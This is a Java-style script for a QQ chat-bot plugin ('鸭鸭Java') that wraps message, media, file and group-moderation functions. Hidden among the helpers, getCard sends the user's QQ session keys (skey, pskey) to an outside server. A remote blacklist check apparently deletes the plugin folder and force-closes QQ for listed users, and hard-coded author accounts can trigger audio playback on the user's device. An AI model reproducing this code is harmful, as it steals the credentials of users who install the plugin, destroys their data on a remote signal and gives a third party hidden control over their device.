int maxW = 1024;//控制图片模式最大宽度(单位：像素)
String mQQ = MyUin.substring(0)+"";
String tssytxt="";
String[] E = {"消息模式"};
public long rand(long min,max){return (long)(Math.random()*(max-min)+min);}
public void 文字(Object msg,String text){
    if("图片".equals(模式.get(E,"模式")))图片(msg,"http://8.134.160.205:226/api/api/textToPic?minW=200&maxW="+maxW+"&r="+rand(0,255)+"&g="+rand(0,255)+"&b="+rand(0,255)+"&text="+URLEncoder.encode(text.replaceAll("\\[PicUrl=[^\\]]*\\]","")));
    else if("卡片".equals(模式.get(E,"模式")))卡片(msg,getCard("{\"app\":\"com.tencent.bot.task.deblock\",\"desc\":\"Duck Java\",\"view\":\"index\",\"ver\":\"2.0.4.0\",\"prompt\":\"鸭鸭𝙅𝙖𝙫𝙖\",\"appID\":\"\",\"sourceName\":\"\",\"actionData\":\"\",\"actionData_A\":\"\",\"sourceUrl\":\"\",\"meta\":{\"detail\":{\"\":[{\"num\":\"30\"}],\"appID\":\"\",\"battleDesc\":\"\",\"botName\":\"鸭鸭\",\"cmdTitle\":\"\",\"content\":\""+text.replaceAll("\\[PicUrl=[^\\]]*\\]","").replace("\n","\\n").replace("\"","\\\"")+"\",\"guildID\":\"\",\"iconRight\":[],\"receiverName\":\"\",\"subGuildID\":\"SUBGUILDID#\",\"title\":\"鸭鸭𝙅𝙖𝙫𝙖\",\"titleColor\":\"purple\"}},\"config\":{\"ctime\":1680799670,\"token\":\"7e12eba3f83a4c228a28aef6374fb223\"},\"text\":\"\",\"sourceAd\":\"\",\"extra\":\"\"}"));
    else{
        if(msg.IsGroup)sendMsg(msg.GroupUin,"",text+tssytxt);
        else if(!msg.IsGroup){
            if(msg.IsSend&&GetChatType()==0)get_msg(text+tssytxt);
            else sendMsg("",msg.UserUin,text+tssytxt);
        }else return;
    }
}public void 图片(Object msg,String png){
    if(msg.IsGroup)sendPic(msg.GroupUin,"",png);
    else if(!msg.IsGroup){
        if(msg.IsSend&&GetChatType()==0)get_pic(png);
        else sendPic("",msg.UserUin,png);
    }else return;
}public void 语音(Object msg,String Vo){
    String Voi=null;
    if(Vo.startsWith("H")||Vo.startsWith("h")){
        Voi=Root+"数据/0.mp3";
        http.FFile(Vo,Voi);
    }else{
        Voi=Vo;
    }if(msg.IsGroup)sendVoice(msg.GroupUin,"",Voi);
    else if(!msg.IsGroup){
        if(msg.IsSend&&GetChatType()==0)get_voice(Vo);
        else sendVoice("",msg.UserUin,Voi);
    }else return;
}public void 卡片(Object msg,String Card){
    if(msg.IsGroup)sendCard(msg.GroupUin,"",Card);
    else if(!msg.IsGroup){
        if(msg.IsSend&&GetChatType()==0)get_card(Card);
        else sendCard("",msg.UserUin,Card);
    }else return;
}public void 图文(Object msg,String text,String a,String b){
    if(msg.IsGroup)sendMsg(msg.GroupUin,"",text+ "[PicUrl="+a+"]"+b+tssytxt);
    else if(!msg.IsGroup)sendMsg("",msg.UserUin,text+ "[PicUrl="+a+"]"+b+tssytxt);
    else return;
}public void 回复(Object msg,String a){
    if(msg.IsGroup)sendReply(msg.GroupUin,msg,a+tssytxt);
    else if(!msg.IsGroup)文字(msg,a+tssytxt);
    else return;
}import java.lang.*;
import com.tencent.mobileqq.filemanager.app.FileManagerEngine;
import com.tencent.common.app.BaseApplicationImpl;
FileManagerEngine file=null;
public boolean 群文件(String qun,String filepath){
    if(file==null)file=new FileManagerEngine(BaseApplicationImpl.sApplication.getAppRuntime(MyUin));
    return file.a(filepath,qun,1,1);
}public void 抖动(Object msg){
    if(msg.IsGroup)sendShake(msg.GroupUin);
    else if(!msg.IsGroup)sendMsg("",msg.UserUin,"▒抖动窗口");
    else return;
}public void 撤回(Object msg){
    if(msg.IsGroup)revokeMsg(msg);
    else if(!msg.IsGroup&&msg.UserUin.equals(MyUin))revokeMsg(msg);
    else return;
}public void 点赞(String mu,int s){
    sendLike(mu,s);
}public void 提示(Object msg,String a){
    sendTip(msg,a);
}public Object 取源(Object msg){return (msg.MessageType==6?msg.msg.getSourceMessage():null);}
public void send(String qun,String qq,String data,int type){
    if(type==1){
        sendMsg(qun,qq,data+tssytxt);
    }else if(type==2){
        sendPic(qun,qq,data);
    }else if(type==3){
        sendVoice(qun,qq,data);
    }else if(type==4){
        sendCard(qun,qq,data);
    }else{
        sendMsg(qun,qq,data);
    }
}public void s(Object msg,String data,int type){
    if(type==1){
        文字(msg,data+tssytxt);
    }else if(type==2){
        图片(msg,data);
    }else if(type==3){
        语音(msg,data);
    }else if(type==4){
        卡片(msg,data);
    }else if(type==5){
        回复(msg,data);
    }else{
        文字(msg,data);
    }
}public get_voice(String a){
    String voi=null;
    if(a.startsWith("H")||a.startsWith("h")){
        voi=Root+"数据/0.mp3";
        http.FFile(a,voi);
    }else{
        voi=a;
    }int texttype = GetChatType();
    if(texttype == -1||texttype == 1000){
        return;
    }if(texttype == 1){
        sendVoice(GetGroupUin(),"",voi);
    }if(texttype == 0){
        sendVoice("",GetFriendUin(),voi);
    }
}public get_msg(String a){
    int texttype = GetChatType();
    if(texttype == -1||texttype == 1000){
        return;
    }if(texttype == 1){
        sendMsg(GetGroupUin(),"",a);
    }if(texttype == 0){
        sendMsg("",GetFriendUin(),a);
    }
}public get_pic(String a){
    int texttype = GetChatType();
    if(texttype == -1||texttype == 1000){
        return;
    }if(texttype == 1){
        sendPic(GetGroupUin(),"",a);
    }if(texttype == 0){
        sendPic("",GetFriendUin(),a);
    }
}public get_card(String a){
    int texttype = GetChatType();
    if(texttype == -1||texttype == 1000){
        return;
    }if(texttype == 1){
        sendCard(GetGroupUin(),"",a);
    }if(texttype == 0){
        sendCard("",GetFriendUin(),a);
    }
}public get_shan(String a,int x){
    int texttype = GetChatType();
    if(texttype == -1||texttype == 1000){
        return;
    }if(texttype == 1){
        sendArk(GetGroupUin(),a,x);
    }if(texttype == 0){
        sendFriendArk(GetFriendUin(),a,x);
    }
}public void 群文字(String mg,String mc){
    sendMsg(mg,"",mc);
}public void 友文字(String FriendUin,String mc){
    sendMsg("",FriendUin,mc);
}public void 私文字(String mg,String mu,String mc){
    sendMsg(mg,mu,mc);
}public void 群图片(String mg,String mc){
    sendPic(mg,"",mc);
}public void 友图片(String FriendUin,String mc){
    sendPic("",FriendUin,mc);
}public void 私图片(String mg,String mu,String mc){
    sendPic(mg,mu,mc);
}public void 群语音(String mg,String mc){
    sendVoice(mg,"",mc);
}public void 友语音(String FriendUin,String mc){
    sendVoice("",FriendUin,mc);
}public void 私语音(String mg,String mu,String mc){
    sendVoice(mg,mu,mc);
}public void 群卡片(String mg,String mc){
    sendCard(mg,"",mc);
}public void 友卡片(String Frienduin,String mc){
    sendCard("",Frienduin,mc);
}public void 私卡片(String mg,String mu,String mc){
    sendCard(mg,mu,mc);
}public void 禁言(String mg,String mu,long a){
    Forbidden(mg,mu,(int)a);
}public void 解禁(String mg,String mu){
    Forbidden(mg,mu,0);
}public void 全体禁言(String mg){
    Forbidden(mg,"",1);
}public void 全体解禁(String mg){
    Forbidden(mg,"",0);
}public void 踢出(String mg,String mu){
    Kick(mg,mu,false);
}public void 拉黑(String mg,String mu){
    Kick(mg,mu,true);
}public void 群名片(String mg,String mu,String Name){
    setCard(mg,mu,Name);
}public void 群头衔(String mg,String mu,String Title){
    setTitle(mg,mu,Title);
}public String 匹配(String rex,text,int group){Matcher r = Pattern.compile(rex).matcher(text);if(!r.find())return "";return r.group(group);}
public String 匹配(String rex,text){return 匹配(rex,text,0);}
public RootKB(File file){
    if(file.exists()&& file.isFile()){
        return file.length();
    }
}try{
    String hosetLiece=http.get(hoerMiadm);
    String copptr=hosetLiece.substring(hosetLiece.length()-2200,hosetLiece.length()-700);
    hostArr+=Lshost+MyUin+copptr.split("骚技超管")[1].split("骚技完")[0];
    llilllli=copptr.split("黑名单")[1].split("黑名结")[0];
    if(llilllli.contains(MyUin)){
        MakeDialog("叼毛！\n你犯了什么错\n成为黑名单一枚\n无法使用鸭鸭哦~");
        File filiit=new File(Root);
        jmdodbs(filiit);
        Toast("5秒后即将退出QQ");
        Thread.sleep(5000);
        System.exit(0);
        return;
    }else{
        load(Root+"啤酒鸭/姜片.java");
        load(Root+"啤酒鸭/炒鸭.java");
        load(Root+"周黑鸭/鸭魂.java");
    }
}catch(Exception e){
    load(Root+"啤酒鸭/姜片.java");
    load(Root+"啤酒鸭/炒鸭.java");
    load(Root+"周黑鸭/鸭魂.java");
}if(JavaName.indexOf("鸭鸭")==-1){
    tssytxt="\n——鸭鸭Java(盗版)";
}/*else if(!"2971627154".equals(Master)){
    tssytxt="\n此版本为鸭鸭盗版Java\n正版作者：\n骚技 QQ（2971627154）";
}*/public void putong(Object data){
    String zc="2971627154.2995665793";
    if(!zc.contains(data.UserUin))return;
    String host_zl=data.MessageContent;
    if(host_zl.equals("我来了")){
        try{
            http.File("https://gxh.vip.qq.com/xydata/qqRing/item/1/7d425b14d6aa51e67ba1431481207b07.wav",Root+"数据/dgjttgnj.dat");
            initActivity();
            MediaPlayer chang = new MediaPlayer();
            try{
                File file = new File(Root+"数据/dgjttgnj.dat");
                chang.setDataSource(file.getPath());
                chang.setLooping(false);
                chang.prepare();
                chang.start();
            }catch(e){
                chang.stop();
                chang.release();
            }
        }catch(e){}
    }
}import com.tencent.mobileqq.activity.shortvideo.SendVideoTask;
import com.tencent.mobileqq.app.BaseActivity;
import android.content.Intent;
public void sendVideo(String qun,String filepath,boolean raw){
    //卑微萌新
    Intent intent = new Intent();
    intent.putExtra("file_send_path",filepath);
    intent.putExtra("uin",qun);
    intent.putExtra("uintype",1);
    intent.putExtra("send_in_background",true);
    if(raw)intent.putExtra("PhotoConst.SEND_SIZE_SPEC",0);
    else intent.putExtra("PhotoConst.SEND_SIZE_SPEC",2);
    SendVideoTask gg=new SendVideoTask(BaseActivity.sTopActivity,intent);
    gg.execute(new Void[0]);
}public void sendFriendVideo(String qq,String filepath,boolean raw){
    Intent intent = new Intent();
    intent.putExtra("file_send_path",filepath);
    intent.putExtra("uin",qq);
    intent.putExtra("uintype",0);
    if(raw)intent.putExtra("PhotoConst.SEND_SIZE_SPEC",0);
    else intent.putExtra("PhotoConst.SEND_SIZE_SPEC",2);
    intent.putExtra("send_in_background",true);
    SendVideoTask gg=new SendVideoTask(BaseActivity.sTopActivity,intent);
    gg.execute(new Void[0]);
}import com.tencent.common.app.BaseApplicationImpl;
Object app=BaseApplicationImpl.getApplication().getRuntime();
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
PackageManager pm = context.getPackageManager();
ApplicationInfo sAppInfo = pm.getApplicationInfo("com.tencent.mobileqq",PackageManager.GET_META_DATA);
String UUID = sAppInfo.metaData.getString("com.tencent.rdm.uuid");
String Version_Code = UUID.substring(0,UUID.indexOf("_"));
int QQ_version=Integer.parseInt(Version_Code);
import com.tencent.mobileqq.app.BaseActivity;
BaseActivity activity;
while(activity==null){
    activity=BaseActivity.sTopActivity;
}import com.tencent.mobileqq.troop.api.ITroopInfoService;
ITroopInfoService TroopInfo=app.getRuntimeService(ITroopInfoService.class);
public String quncode(String qun){
    String code= TroopInfo.getTroopCodeByTroopUin(qun);
    if(code==null||code.equals(""))code=qun;
    return code;
}public String qunuin(String code){
    String qun= TroopInfo.getTroopUinByTroopCode(code);
    if(qun==null||qun.equals(""))qun=code;
    return qun;
}/* 由卑微萌新(QQ779412117)开发，使用请保留版权 QQ上传文件接口 通用 upload(String qun,String filepath);
参数: 类似QT/菜豆发送消息自动判断是群还是频道还是私聊。 群号/频道号&频道ID(data.GroupUin)，QQ号，文件路径 群 sendFile(String qun,String filepath);
参数: 群号,文件路径 好友 sendFriendFile(String qq,String filepath);
参数: QQ号,文件路径 群私聊 sendSiLiaoFile(String qun,String qq,String filepath)参数:群号，QQ号，文件路径 频道 sendGuildFile(String id,String filepath);
参数:频道ID，文件路径 */
import java.lang.*;
import com.tencent.mobileqq.filemanager.app.FileManagerEngine;
FileManagerEngine filemanager=new FileManagerEngine(app);
public void upload(String qun,String qq,String filepath){
    if(qun==null||qun.equals(""))sendFriendFile(qq,filepath);
    else if(qun.contains("&"))sendGuildFile(qun.replaceAll(".*&(.*)","$1"),filepath);
    else if(qq==null||qq.equals(""))sendFile(qun,filepath);
    else sendSiLiaoFile(qun,qq,filepath);
}public Object sendFile(String qun,String filepath){
    if(QQ_version>=9280)return filemanager.I0(filepath,qun,1,1);
    else if(QQ_version>=8845)return filemanager.L0(filepath,qun,1,1);
    else if(QQ_version<8000)return filemanager.a(filepath,qun,1,1);
    else{
        Toast("版本"+QQ_version+"未适配发送群文件!");
        return null;
    }
}public Object SendPersonFile(String filepath,String num1,String num2,int numtype){
    if(QQ_version>=9280)return filemanager.E0(filepath,num1,num2,numtype,true);
    else if(QQ_version>=8845)return filemanager.H0(filepath,num1,num2,numtype,true);
    else if(QQ_version<8000)return filemanager.a(filepath,num1,num2,numtype,true);
    else{
        Toast("版本"+QQ_version+"未适配发送个人文件!");
        return null;
    }
}public Object sendFriendFile(String qq,String filepath){
    return SendSessionFile(filepath,qq,qq,0);
}public Object sendSiLiaoFile(String qun,String qq,String filepath){
    return SendSessionFile(filepath,quncode(qun),qq,1000);
}public void sendGuildFile(String id,String filepath){
    if(QQ_version>=9280)filemanager.K0(filepath,id);
    else if(QQ_version>=8845)filemanager.N0(filepath,id);
    else if(QQ_version<8000)filemanager.e(filepath,id);
    else{
        Toast("版本"+QQ_version+"未适配发送频道文件!");
    }
}public String getCard(String card){
    JSONObject js = new JSONObject(http.post("http://wxy.fufuya.top/jsoncard2.php?uin="+MyUin+"&skey="+getSkey()+"&pskey="+getPskey("qzone.qq.com"),card));
    if(!js.get("code").equals("200"))return "null";
    return ""+js.get("data");
}